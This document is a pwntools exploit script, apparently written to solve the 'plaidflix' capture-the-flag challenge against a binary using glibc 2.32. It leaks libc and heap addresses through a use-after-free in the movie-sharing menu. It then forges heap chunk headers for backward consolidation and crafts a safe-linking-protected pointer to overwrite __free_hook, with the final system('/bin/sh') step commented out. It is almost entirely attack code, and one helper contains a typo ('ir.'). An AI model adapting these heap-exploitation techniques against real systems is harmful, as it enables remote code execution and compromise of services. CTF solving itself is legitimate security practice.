#!/usr/bin/python3

from pwn import *
import sys

HOST = 'plaidflix.pwni.ng'
PORT = 1337
BINARY = "./P"
LIB = './libc-2.32.so'

l = ELF(LIB)

context.arch = 'amd64'

if len(sys.argv) == 1:
    r = process(BINARY, env={"LD_PRELOAD": LIB})
else:
    r = remote(HOST, PORT)
    
def add_movie(title,rating=5):
    r.sendlineafter("> ","0")
    r.sendlineafter("> ","0")
    r.sendlineafter("> ",title)
    r.sendlineafter("> ",str(rating))

def remove_movie(i):
    r.sendlineafter("> ","0")
    r.sendlineafter("> ","1")
    r.sendlineafter("> ",str(i))

def show_movies():
    r.sendlineafter("> ","0")
    r.sendlineafter("> ","2")

def share_movie(movie_i,friend_i):
    r.sendlineafter("> ","0")
    r.sendlineafter("> ","3")
    r.sendlineafter("> ",str(movie_i))
    r.sendlineafter("> ",str(friend_i))

def add_friend(size,name):
    r.sendlineafter("> ","1")
    r.sendlineafter("> ","0")
    r.sendlineafter("> ",str(size))
    r.sendlineafter("> ",name)

def remove_friend(i):
    r.sendlineafter("> ","1")
    r.sendlineafter("> ","1")
    r.sendlineafter("> ",str(i))

def show_friends():
    r.sendlineafter("> ","1")
    ir.sendlineafter("> ","2")

info(f"""
movie: 0x60c0
""")

r.sendlineafter('> ', '= =')

##### leak #####

add_movie('Q')
for i in range(8):
    add_friend(0x88-1, 'OWO')

share_movie(0, 0)
for i in range(7, -1, -1):
    remove_friend(i)

for _ in range(8):
    add_friend(0x90-1, 'OWO')

show_movies()
r.recvuntil('* Shared with: ')
libc = u64(r.recv(6).ljust(8, b'\x00')) - 0x1e3c80

share_movie(0, 0)
remove_friend(0)
remove_friend(1)

show_movies()
r.recvuntil('* Shared with: ')
heap = u64(r.recv(5).ljust(8, b'\x00')) << 12

info(f"""
libc = {hex(libc)}
heap = {hex(heap)}
""")

##### exploit #####

def delete_account():
    r.sendlineafter("> ","2")
    r.sendlineafter("> ","y")

def add_feedback(text):
    r.sendlineafter("> ","0")
    r.sendlineafter("> ",text)

def delete_feedback(i):
    r.sendlineafter("> ","1")
    r.sendlineafter("> ",str(i))

def add_contact(text):
    r.sendlineafter("> ","2")
    r.sendlineafter("> ",text)

delete_account()

chunk_addr = heap + 0xe80
fake_chunk = heap + 0xfb0

add_feedback('0') # 0
add_feedback('1') # 1
add_feedback(flat(0, 0, 0, -0x130, chunk_addr, chunk_addr)) # size = -0x130 # 2

for i in range(3, 10): # 3-9
    add_feedback(str(i))

for i in range(2, 9): # fill tcache
    delete_feedback(i) # 2-8

# put into unsorted bin, 0x220 chunk
delete_feedback(0) # 0xd70 # 0
delete_feedback(1) # 0xe80 # 1

add_contact(b'A'*0x100+flat(-0x130, 0x440, fake_chunk, fake_chunk)) # overwrite chunk 1 header
# last: 0xea0
## 0x440: need to bypass prev_use bit check
## and chunk will merge with chunk_addr - (-0x130)

delete_feedback(1)
## 0xfb0 will be (0x440-0x130 == 0x310) chunk

for i in range(7): # 0-6
    add_feedback(str(i)) # clear tcache

add_feedback('7') # 7
## unsorted bin chunk will remain a 0x310 - 0x110 == 0x200 chunk
## put 0xf0 unsorted bin chunk to smallbin

delete_feedback(4)
delete_feedback(5)
delete_feedback(7)
"""
|       7      | (0xfb0)
|       5      | (0x0a0)
| unsorted bin | (0x0c0)
|       4      | (0x1b0)
"""

def PROTECT_PTR(pos, ptr):
    return (ptr >> 12) ^ pos

input()
add_feedback(b'Q'*0xe0 + p64(0) + p64(0x111) + p64(PROTECT_PTR(l.sym['__free_hook'] + libc, heap+0x10b0))[:-1])
#add_feedback('/bin/sh')
#add_feedback(p64(l.sym['system'] + libc))

r.interactive()
